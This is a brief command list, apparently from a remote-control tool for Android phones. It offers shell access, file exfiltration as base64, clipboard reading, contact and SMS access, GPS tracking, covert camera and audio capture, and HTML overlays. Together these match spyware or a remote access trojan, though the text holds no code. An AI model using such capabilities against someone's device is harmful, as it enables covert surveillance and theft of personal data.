📋 Available Commands

ping – test connection
screenshot – capture screen (PNG)
start_mirror – start live mirror
stop_mirror – stop mirror
shell "cmd" – run shell command
launch_app "pkg" – launch app by package
list_files "path" – list directory
download_file "path" – download file as base64
notification "msg" – send notification
clipboard "text" – set clipboard
get_clipboard – read clipboard
sms "number|message" – send SMS
contacts – list contacts
location – get GPS location
camera – take photo (returns image)
audio "duration" – record audio (seconds)
device_info – device info
packages – list installed apps
wifi – scan WiFi networks
flashlight true/false – toggle flashlight
vibrate "ms" – vibrate
brightness "0-100" – set screen brightness
volume "0-100" – set media volume
download_url "url" – download from URL
call "number" – make a phone call
lock – lock screen (PIN required)
html "html_code" – display HTML overlay
